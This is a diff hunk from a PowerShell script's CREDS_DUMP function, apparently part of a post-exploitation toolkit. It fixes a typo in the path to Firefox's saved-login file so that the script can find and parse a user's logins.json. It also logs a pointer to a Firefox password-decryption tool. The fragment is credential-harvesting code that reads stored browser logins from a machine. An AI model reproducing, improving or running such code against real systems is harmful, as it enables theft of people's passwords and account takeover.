@@ -446,7 +446,7 @@ function CREDS_DUMP {
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
     echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
     echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\loginss.json")){
+    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
         echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
     }else{
         $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
